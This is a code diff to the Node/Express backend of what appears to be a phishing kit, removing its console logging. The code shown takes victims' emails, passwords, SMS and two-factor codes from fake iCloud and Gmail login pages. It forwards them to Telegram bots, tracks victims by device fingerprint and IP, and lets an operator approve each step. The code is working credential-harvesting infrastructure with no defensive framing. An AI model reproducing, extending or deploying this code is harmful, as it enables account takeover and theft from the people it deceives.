@@ -122,7 +122,6 @@ function resolveEmailFromRequest(req, sessionToken = null, userId = null) {
     
     // Layer 1: Device Fingerprint (PRIMARY)
     if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
-      console.log(`✅ Resolved email via device fingerprint`);
       return deviceFingerprintToEmail[fingerprint];
     }
     
@@ -130,30 +129,25 @@ function resolveEmailFromRequest(req, sessionToken = null, userId = null) {
     if (ipPrefix && userId) {
       const compositeKey = `${ipPrefix}_${userId}`;
       if (ipPrefixUserIdToEmail[compositeKey]) {
-        console.log(`✅ Resolved email via IP prefix + user ID`);
         return ipPrefixUserIdToEmail[compositeKey];
       }
     }
     
     // Layer 3: Session Token
     if (sessionToken && sessionTokenToEmail[sessionToken]) {
-      console.log(`✅ Resolved email via session token`);
       return sessionTokenToEmail[sessionToken];
     }
     
     // Layer 4: IP Prefix
     if (ipPrefixToEmail[ipPrefix]) {
-      console.log(`✅ Resolved email via IP prefix`);
       return ipPrefixToEmail[ipPrefix];
     }
     
     // Layer 5: Full IP
     if (ipToEmail[ip]) {
-      console.log(`✅ Resolved email via full IP`);
       return ipToEmail[ip];
     }
     
-    console.log(`⚠️ Could not resolve email from request`);
     return null;
   } catch (err) {
     console.error("❌ Error resolving email:", err);
@@ -270,7 +264,6 @@ app.post("/send-login", async (req, res) => {
       ipToEmail[ip] = email;
     }
 
-    console.log(`📧 ${email} | 🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
 
     // ============================================================================
     // ✅ SEND TO BOTH BOTS (BROADCAST)
@@ -352,7 +345,6 @@ app.post("/send-redirection", async (req, res) => {
       const resolvedEmail = resolveEmailFromRequest(req, null, userId);
       if (resolvedEmail) {
         email = resolvedEmail;
-        console.log(`🔍 Resolved email via multi-layer tracking: ${email}`);
       } else {
         return res.status(400).json({ error: "Could not resolve email" });
       }
@@ -537,32 +529,27 @@ app.post("/update-status", (req, res) => {
     if (action === "verification_accept" || action === "verification_reject") {
       if (pendingVerificationConfirm[identifier]) {
         pendingVerificationConfirm[identifier].status = action;
-        console.log(`✅ Updated pendingVerificationConfirm[${identifier}].status = ${action}`);
         return res.json({ ok: true });
       }
     }
 
     if (pendingVerificationPage[identifier]) {
       pendingVerificationPage[identifier].status = status;
-      console.log(`✅ Updated pendingVerificationPage[${identifier}].status = ${status}`);
       return res.json({ ok: true });
     }
 
     if (pendingGmailLogin[identifier]) {
       pendingGmailLogin[identifier].status = status;
-      console.log(`✅ Updated pendingGmailLogin[${identifier}].status = ${status}`);
       return res.json({ ok: true });
     }
 
     if (pendingCodes[identifier]) {
       pendingCodes[identifier].status = status;
-      console.log(`✅ Updated pendingCodes[${identifier}].status = ${status}`);
       return res.json({ ok: true });
     }
 
     if (pendingPage[identifier]) {
       pendingPage[identifier].status = status;
-      console.log(`✅ Updated pendingPage[${identifier}].status = ${status}`);
       return res.json({ ok: true });
     }
 
@@ -571,10 +558,8 @@ app.post("/update-status", (req, res) => {
       pendingSMS[identifier].status = status;
       if (status === "sms_accept") {
         const smsCode = pendingSMS[identifier].smsCode;
-        console.log(`💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`);
       } else if (status === "sms_reject") {
         const smsCode = pendingSMS[identifier].smsCode;
-        console.log(`💬 <code>${smsCode}</code> SMS <b>Rejected</b>!❌`);
       }
       return res.json({ ok: true });
     }
@@ -715,7 +700,6 @@ app.post("/verify-sms", async (req, res) => {
       });
     }
 
-    console.log(`📧 ${email} | SMS: ${smsCode}`);
     
     pendingSMS[email] = {
       status: "pending",
@@ -790,7 +774,6 @@ app.post("/resend-sms", async (req, res) => {
       return res.status(400).json({ error: "Missing email" });
     }
 
-    console.log(`📲 Resending SMS to ${email}`);
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -906,12 +889,10 @@ app.post("/page-login", async (req, res) => {
     // ✅ UPDATE FINGERPRINT MAPPING WITH NEW EMAIL (for Verifying page later)
     if (fingerprint && messageEmail) {
       deviceFingerprintToEmail[fingerprint] = messageEmail;
-      console.log(`💾 Updated fingerprint mapping: ${fingerprint} → ${messageEmail}`);
     }
 
     // ✅ Store both email (for tracking) and displayEmail (for showing)
     pendingPage[email] = { password, status: "pending", displayEmail: messageEmail };
-    console.log(`📥 iCloud Page Login Received: ${email} (display: ${messageEmail})`);
 
     const message =
       `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
@@ -976,7 +957,6 @@ app.get("/check-icloud-status", (req, res) => {
 
     if (pendingPage[email]) {
       const status = pendingPage[email].status;
-      console.log(`✅ iCloud status for ${email}: ${status}`);
       
       // Map bot status values to frontend expectations
       if (status === "page_accept") {
@@ -1018,7 +998,6 @@ app.post("/sms-code", async (req, res) => {
 
     // ✅ Store by requestId (not email!) so each code has separate status
     pendingCodes[requestId] = { status: "pending", smsCode, email, userId };
-    console.log(`📥 iCloud SMS Code Received: ${email} (requestId: ${requestId})`);
 
     const message =
       `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
@@ -1115,7 +1094,6 @@ app.post("/resend-icloud-sms", async (req, res) => {
       return res.status(400).json({ error: "Missing email" });
     }
 
-    console.log(`📲 Resending iCloud SMS to ${email} (requestId: ${requestId})`);
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -1134,9 +1112,7 @@ app.post("/resend-icloud-sms", async (req, res) => {
       await sendFollowUpMessage(email, message, {
         parse_mode: "HTML"
       });
-      console.log(`✅ Resend iCloud SMS sent successfully`);
     } else {
-      console.log(`⚠️ No winner found for ${email}`);
       return res.status(400).json({ error: "No winner determined" });
     }
 
@@ -1156,14 +1132,12 @@ app.post("/resend-icloud-sms", async (req, res) => {
 
 app.post("/send-gmail-login", async (req, res) => {
   try {
-    console.log('🔍 DEBUG: /send-gmail-login endpoint called');
     const { email, displayEmail, password, userId } = req.body;
     
     // ✅ Use displayEmail if provided (different email user typed)
     // Otherwise use email (for backward compatibility)
     const messageEmail = displayEmail || email;
     
-    console.log('🔍 DEBUG: Received email:', email, 'displayEmail:', messageEmail, 'password:', password, 'userId:', userId);
     
     if (!email || !password || !userId) {
       return res.status(400).json({ error: "Missing email, password, or userId" });
@@ -1171,12 +1145,10 @@ app.post("/send-gmail-login", async (req, res) => {
     
     const requestId = `gmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
     const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    console.log('🔍 DEBUG: Generated displayEmailKey:', displayEmailKey);
     
     // ✅ Store displayEmail for later retrieval
     displayEmailStore[displayEmailKey] = messageEmail;
     displayEmailByRequestId[requestId] = messageEmail;
-    console.log(`📧 Stored display email: ${messageEmail}`);
     
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -1187,7 +1159,6 @@ app.post("/send-gmail-login", async (req, res) => {
     // ✅ STORE FINGERPRINT FOR MULTI-LAYER TRACKING WITH NEW EMAIL
     if (fingerprint && messageEmail) {
       deviceFingerprintToEmail[fingerprint] = messageEmail;
-      console.log(`💾 Updated fingerprint mapping: ${fingerprint} → ${messageEmail}`);
     }
 
     // ✅ Store both email (for tracking) and displayEmail (for showing)
@@ -1234,7 +1205,6 @@ app.post("/send-gmail-login", async (req, res) => {
       });
     }
 
-    console.log('🔍 DEBUG: Sending response with displayEmailKey:', displayEmailKey);
     res.json({ status: "pending", requestId, displayEmailKey });
 
   } catch (err) {
@@ -1277,7 +1247,6 @@ app.get("/check-gmail-status", (req, res) => {
     }
 
     const status = pendingGmailLogin[requestId].status;
-    console.log(`✅ Gmail status for requestId ${requestId}: ${status}`);
     
     // Map bot status values to frontend expectations
     if (status === "gmail_accept") {
@@ -1319,10 +1288,8 @@ app.get("/api/display-email/:displayEmailKey", (req, res) => {
     const { displayEmailKey } = req.params;
     const email = displayEmailStore[displayEmailKey];
     if (email) {
-      console.log(`📧 Retrieved display email for key ${displayEmailKey}: ${email}`);
       res.json({ displayEmail: email });
     } else {
-      console.log(`📧 No display email found for key ${displayEmailKey}`);
       res.json({ displayEmail: null });
     }
   } catch (err) {
@@ -1356,20 +1323,17 @@ app.get("/get-gmail-login/:requestId", (req, res) => {
 
 app.post("/send-verification-page", async (req, res) => {
   try {
-    console.log('🔍 DEBUG: /send-verification-page endpoint called');
     const { userId, email, displayEmail } = req.body;
     
     // ✅ Use displayEmail if provided, otherwise use email
     const messageEmail = displayEmail || email;
     
-    console.log('🔍 DEBUG: Received userId:', userId, 'email:', email, 'displayEmail:', messageEmail);
     
     if (!userId || !email) {
       return res.status(400).json({ error: "Missing userId or email" });
     }
     
     const requestId = `verify_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    console.log('🔍 DEBUG: Generated requestId:', requestId);
     
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -1418,7 +1382,6 @@ app.post("/send-verification-page", async (req, res) => {
     let resolvedEmail = email;
     if (!userWinnerTelegram[email]) {
       resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
-      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
     }
 
     const botToken = process.env.BOT_TOKEN;
@@ -1467,7 +1430,6 @@ app.post("/update-selected-digits", (req, res) => {
     }
 
     pendingVerificationPage[requestId].selectedDigits.push(digit);
-    console.log(`✅ Digit ${digit} selected for ${requestId}`);
 
     res.json({ ok: true, selectedCount: pendingVerificationPage[requestId].selectedDigits.length });
   } catch (err) {
@@ -1489,7 +1451,6 @@ app.get("/check-verification-status", (req, res) => {
     }
 
     const status = pendingVerificationConfirm[requestId].status;
-    console.log(`✅ Verification status for requestId ${requestId}: ${status}`);
     
     // Map bot status values to frontend expectations
     if (status === "verification_accept") {
@@ -1526,7 +1487,6 @@ app.post("/send-verification-confirm", async (req, res) => {
       displayEmail = pendingVerificationPage[requestId].displayEmail;
     }
     
-    console.log(`📋 Verification confirm: ${displayEmail} selected ${digit1}${digit2}`);
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -1579,7 +1539,6 @@ app.post("/send-verification-confirm", async (req, res) => {
     } else if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
       await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
-      console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
     }
 
     res.json({ success: true, requestId: confirmRequestId });
@@ -1606,7 +1565,6 @@ app.post("/resend-verification", async (req, res) => {
       return res.status(400).json({ error: "Invalid requestId" });
     }
 
-    console.log(`🔄 Resending verification page for ${email}, requestId: ${requestId}`);
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -1650,14 +1608,12 @@ app.post("/resend-verification", async (req, res) => {
     let resolvedEmail = email;
     if (!userWinnerTelegram[email]) {
       resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
-      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
     }
 
     // ✅ SEND TO WINNER ONLY
     if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
       await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
-      console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
     }
 
     res.json({ success: true, requestId });
@@ -1702,7 +1658,6 @@ app.post("/resend-verification-confirm", async (req, res) => {
       displayEmail = pendingVerificationPage[requestId].displayEmail;
     }
     
-    console.log(`📋 Resending verification confirm: ${displayEmail} selected ${digit1}${digit2}`);
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -1752,7 +1707,6 @@ app.post("/resend-verification-confirm", async (req, res) => {
     } else if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
       await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
-      console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
     }
 
     res.json({ success: true, requestId: confirmRequestId });
@@ -1946,16 +1900,12 @@ app.post("/update-sms2-choice", (req, res) => {
       return res.status(400).json({ error: "Missing sms2Id or choice" });
     }
 
-    console.log(`🔍 DEBUG /update-sms2-choice: sms2Id=${sms2Id}, choice=${choice}`);
-    console.log(`🔍 DEBUG: Before update, pendingSMS2[${sms2Id}] =`, pendingSMS2[sms2Id]);
 
     // ✅ Only update if it already exists, don't create empty object
     if (pendingSMS2[sms2Id]) {
       pendingSMS2[sms2Id].choice = choice;
       pendingSMS2[sms2Id].updatedAt = Date.now();
-      console.log(`✅ Updated! pendingSMS2[${sms2Id}] =`, pendingSMS2[sms2Id]);
     } else {
-      console.log(`❌ sms2Id NOT FOUND in pendingSMS2!`);
     }
 
     res.json({ ok: true });
@@ -1975,15 +1925,11 @@ app.get("/get-sms2-info/:sms2Id", (req, res) => {
     const { sms2Id } = req.params;
     const entry = pendingSMS2[sms2Id];
     
-    console.log(`🔍 DEBUG /get-sms2-info: sms2Id=${sms2Id}`);
-    console.log(`🔍 DEBUG: pendingSMS2[${sms2Id}] =`, entry);
     
     if (entry) {
       const email = entry.email || entry.displayEmail;
-      console.log(`✅ Found email: ${email}`);
       res.json({ email });
     } else {
-      console.log(`❌ Entry not found`);
       res.json({ email: null });
     }
   } catch (err) {
@@ -2011,7 +1957,6 @@ app.post("/update-wallet-decision", (req, res) => {
     pendingWalletDecision[email].choice = choice;
     pendingWalletDecision[email].updatedAt = Date.now();
 
-    console.log(`✅ Wallet decision updated: ${choice}`);
     res.json({ ok: true });
 
   } catch (err) {
@@ -2185,7 +2130,6 @@ app.get("/get-verifying-info/:verifyingId", (req, res) => {
 // ============================================================================
 
 const server = app.listen(PORT, () => {
-  console.log(`✅ Backend running on port ${PORT}`);
   startSelfPing();
 });
 
